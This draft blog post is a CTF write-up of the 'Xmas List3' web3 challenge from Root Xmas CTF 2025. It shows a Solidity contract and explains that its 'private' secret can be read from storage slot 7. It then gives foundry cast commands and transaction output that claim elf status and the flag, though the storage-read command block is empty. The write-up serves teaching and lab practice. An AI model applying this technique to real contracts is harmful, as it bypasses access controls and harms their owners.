---
authors: este
date: '2025-12-11T16:14:57+01:00'
draft: true
title: 'Xmas List3 | Root Xmas CTF 2025'
tags: ["web3"]
keywords: ["web3"]
showtoc: true
UseHugoToc: true
tocopen: true
ShowReadingTime: true
ShowWordCount: true
---

## Introduction


{{< figure src="/shr3k/image/key-magic-key.gif" class="center-fig" alt="Magic Key" >}}

Last year, Santa noticed that some mischievous elves had been diverting gifts!

This year, he decided to secure his entire supply chain using blockchain technology.

But since Santa isn’t exactly comfortable with this new system, the developer gave him a special key that lets him hand over the distribution process "safely"...

We have presented a little website with this info 

|Your private key  |   0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb|
|Your address   |  0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85|
|Challenge's address  |   0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40|
|RPC URL  |   http://dyn-01.xmas.root-me.org:13021/rpc|
|Chain ID  |   1337|
|Flag |Whatever|
    
And a Challenge.sol file wich [...]

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.20;

contract RM_Xmas_List3 {
    address public santaClaus;

    struct Elf {
        string name;
        uint256 level;
        address account;
    }

    struct Gift {
        string description;
        uint256 elfId; 
        uint256 childId;
        address childFor;
        bool delivered;
    }

    struct Child {
        string name;
        address reservedFor;
        bool delivered;
    }

    Elf[] public elves;
    Gift[] public gifts;
    Child[] public children;

    mapping(address => uint256) public elvesId;
    mapping(address => uint256) public childId;
    mapping(address => uint256) public childNonce;

    bytes32 private magicXmasS3cr3t; 

    modifier onlySanta() {
        require(msg.sender == santaClaus, "Only Santa can access this function");
        _;
    }

    modifier onlyElf() {
        require(elvesId[msg.sender] > 0, "Only Elf");
        _;
    }

    constructor(bytes32 _magicXmasS3cr3t) {
        santaClaus = msg.sender;
        magicXmasS3cr3t = keccak256(abi.encodePacked(_magicXmasS3cr3t, santaClaus));
    }

    function registerElf(string calldata _name, uint256 _level, address _account) external onlySanta returns (uint256 id) {
        require(_account != address(0), "zero address");
        require(elvesId[_account] == 0, "already elf");

        id = elves.length;
        elves.push(Elf({name: _name, level: _level, account: _account}));
        elvesId[_account] = id + 1;
    }

    function registerChild(string calldata _name) external returns (uint256 id) {
        require(childId[msg.sender] == 0, "already registered");
        id = children.length;
        children.push(Child({name: _name, reservedFor: msg.sender, delivered: false}));
        childId[msg.sender] = id + 1;
    }

    function prepareGift(string calldata _description, uint256 _childId) external onlyElf returns (uint256 giftId) {
        require(_childId < children.length, "Invalid child");

        Gift memory gift = Gift({
            description: _description,
            elfId: elvesId[msg.sender],
            childId: _childId,
            childFor: children[_childId].reservedFor,
            delivered: false
        });

        giftId = gifts.length;
        gifts.push(gift);
    }

    function deliverGift(uint256 _giftId) external onlyElf {
        require(_giftId < gifts.length, "Invalid gift");
        Gift storage g = gifts[_giftId];
        require(!g.delivered, "Already delivered");
        g.delivered = true;
        children[g.childId].delivered = true;
    }

    function getElvesCount() external view returns (uint256) {
        return elves.length;
    }

    function claimElfBySecret(string calldata _name, bytes32 _guess) external {
        require(_guess == magicXmasS3cr3t, "Bad magic Xmas Secret Word");
        uint256 id = elves.length;
        elves.push(Elf({name: _name, level: 1, account: msg.sender}));
        elvesId[msg.sender] = id + 1;
    }
    
    function getGiftInfo(uint256 _giftId) external view returns (
            string memory description,
            uint256 elfId,
            string memory childName,
            address childFor,
            bool delivered
        )
    {
        require(_giftId < gifts.length, "Invalid gift");
        Gift storage g = gifts[_giftId];
        description = g.description;
        elfId = g.elfId;
        childName = children[g.childId].name;
        childFor = g.childFor;
        delivered = g.delivered;
    }
    
    function getChildInfo(uint256 _id) external view returns (
            string memory name,
            address reservedFor,
            bool delivered
        )
    {
        require(_id < children.length, "Invalid Child ID");
        Child storage c = children[_id];
        name = c.name;
        reservedFor = c.reservedFor;
        delivered = c.delivered;
    }

    function getElfInfo(uint256 _id) external view returns (
            string memory name,
            uint256 level,
            address account
        )
    {
        require(_id < elves.length, "Invalid elf ID");
        Elf storage a = elves[_id];
        name = a.name;
        level = a.level;
        account = a.account;
    }

    function isSolved() external view returns (bool) {
        return elvesId[msg.sender] > 0;
    }
}
```

The ```isSolved()``` function relies on the sender's address being registered in the elvesId mapping:
Solidity
```
function isSolved() external view returns (bool) {
    return elvesId[msg.sender] > 0;
}
```
There are two functions to become an Elf:

   ```registerElf(...):``` Protected by onlySanta. Requires the deployer's key, which we do not have.

   ```claimElfBySecret(string calldata _name, bytes32 _guess):``` Allows any user to register as an Elf if they can provide the correct _guess, which must match the contract's secret: magicXmasS3cr3t.

The exploit path is clear: We must find the value of the magicXmasS3cr3t variable.

## The vulnerability

```bytes32 private magicXmasS3cr3t;```

Private doesnt prevent external clients from reading the raw blockchain chain storage. Ethereum state is publicly visible. 

The variable is initialized in the constructor:

```
constructor(bytes32 _magicXmasS3cr3t) {
    santaClaus = msg.sender;
    magicXmasS3cr3t = keccak256(abi.encodePacked(_magicXmasS3cr3t, santaClaus));
}
```

| Slot | Index | Variable | Type |
|------|----------|-------|------|
|   0  |santaClaus|address| public|
|1|elves|Elf[            ]| public|
|2|gifts|Gift[          ] | public|
|3|children|Child[]       | public|
|4|elvesId|mapping        | (...) |
|5|childId|mapping        | (...) |
|6|childNonce|mapping     | (...) |
|7|magicXmasSecr3t|bytes32|private|

The target variable is located in storage slot ```7```.

## Exploiting the vulnerability

We can use the ```cast``` tool from the [foundry](https://foundryup.com) framework to interact with the RPC endpoint.

|RPC|URL|http://dyn-01.xmas.root-me.org:13021/rpc|
|------|----------|-------|------|
|Contract|Adress|0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40|
|Attacker|Private key|0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb|
|Attacker|Adress|0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85|

### Step 1: Read the magicXmasS3cre3t

We can use the cast storage to query the content of slot 7 at the challenge contracty address.

Lets set some environment variables

```
export RPC_URL="http://dyn-01.xmas.root-me.org:13021/rpc"
export CONTRACT_ADDRESS="0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40"
export PRIVATE_KEY="0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb"
export ACCOUNT_ADDRESS="0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85"
```

Then we can read the secret from storage slot 7

```
```

We can now retrieve the $MAGIC_SECRET to call claimElfBySecret vi a transaction signed with our private key.

```
shr3k@shr3k:~$ cast send $CONTRACT_ADDRESS \
"claimElfBySecret(string,bytes32)" \
"YourElfName2" \
$MAGIC_SECRET \
--private-key $PRIVATE_KEY \
--rpc-url $RPC_URL \
--from $ACCOUNT_ADDRESS

blockHash            0xfd8fdb905f205f093d49fd77c33a83a01bdcdb3ebd907c84601255bcc98c169d
blockNumber          4
contractAddress
cumulativeGasUsed    119829
effectiveGasPrice    684231441
from                 0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85
gasUsed              119829
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status               1 (success)
transactionHash      0xa7e0d8ee34224bc95c3cb3283cf6abf13a14361791028f6f3028bf40a595b0af
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed
to                   0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40
```

We can now verify the transaction by going on the website, when we click **Claim the flag**
we obtain : 
Flag     RM{N0_S3cr3t_C4n_B3_H1dd3n_0n_Ch41n}
